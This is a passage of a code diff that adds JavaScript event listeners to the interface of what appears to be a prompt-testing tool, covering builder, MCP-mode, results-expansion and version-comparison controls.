     el("analyzeBtn").addEventListener("click", () => onCapturePrimary());
     el("modeQuality").addEventListener("click", () => setMode("quality"));
-    el("modeTools").addEventListener("click", () => setMode("tools"));
+    el("modeTools").addEventListener("click", () => {
+      setMode("tools");
+      void onToToolTests();
+    });
+    el("modeMcp").addEventListener("click", () => onMcpMode());
     el("grabBtn").addEventListener("click", () => void onGrab());
+    el("buildBtn").addEventListener("click", () => openBuilder());
+    el("builderBackBtn").addEventListener("click", () => show("capture"));
+    el("builderSendBtn").addEventListener("click", () => void onBuilderSend());
+    el("builderGenerateBtn").addEventListener("click", () => void onBuilderGenerate());
+    el("builderUseBtn").addEventListener("click", () => onBuilderUse());
+    el("builderInput").addEventListener("keydown", (e) => {
+      const ev = e;
+      if (ev.key === "Enter" && (ev.metaKey || ev.ctrlKey)) {
+        ev.preventDefault();
+        void onBuilderSend();
+      }
+    });
+    el("builderLog").addEventListener("click", (e) => {
+      const chip = e.target.closest(".sugg");
+      const fill = chip?.dataset["fill"];
+      if (fill === void 0) return;
+      const box = el("builderInput");
+      box.value = fill;
+      box.focus();
+    });
     el("versionPicker").addEventListener("change", () => onPickVersion());
     el("saveKey").addEventListener("click", () => void onSaveKey());
     el("settingsBtn").addEventListener("click", () => void openSettings());
@@ -6960,13 +8349,24 @@ ${existing}`
     el("addScenarioBtn").addEventListener("click", () => void onAddScenario());
     el("casesBackBtn").addEventListener("click", () => show(state.mode === "tools" ? "capture" : "evalprompt"));
     el("runBtn").addEventListener("click", () => void onRun());
+    el("resultsHost").addEventListener("click", (e) => {
+      const row = e.target.closest(".mrow");
+      if (!row) return;
+      const detail = row.nextElementSibling;
+      if (detail?.classList.contains("mdetail")) {
+        detail.classList.toggle("hidden");
+        row.classList.toggle("open");
+      }
+    });
     el("resultsBackBtn").addEventListener("click", () => show("cases"));
     el("fixBtn").addEventListener("click", () => void onFixes());
-    el("resultsVersionsBtn").addEventListener("click", () => void showVersions());
+    el("resultsVersionsBtn").addEventListener("click", () => void showVersions("results"));
     el("fixesBackBtn").addEventListener("click", () => show("results"));
-    el("fixesVersionsBtn").addEventListener("click", () => void showVersions());
+    el("fixesVersionsBtn").addEventListener("click", () => void showVersions("fixes"));
     el("fixesEditBtn").addEventListener("click", () => void onApplyFixesAndEdit());
-    el("versionsBackBtn").addEventListener("click", () => show("results"));
+    el("compareA").addEventListener("change", () => renderAxisPair());
+    el("compareB").addEventListener("change", () => renderAxisPair());
+    el("versionsBackBtn").addEventListener("click", () => show(versionsReturnTo));
     el("versionsEditBtn").addEventListener("click", () => goCapture());
     el("exportMd").addEventListener("click", () => void exportReport("md"));
     el("exportJson").addEventListener("click", () => void exportReport("json"));
@@ -6977,10 +8377,14 @@ ${existing}`
       if (Number.isInteger(i)) {
         state.cases.splice(i, 1);
         persistSession();
-        void showCases(false);
+        void renderCasesView();
       }
     });
     show("capture");
+    initMcpPanel({ onBack: () => {
+      setMode(state.mode);
+      show("capture");
+    } });
     void (async () => {
       await applyDefaults();
       await restoreSession();
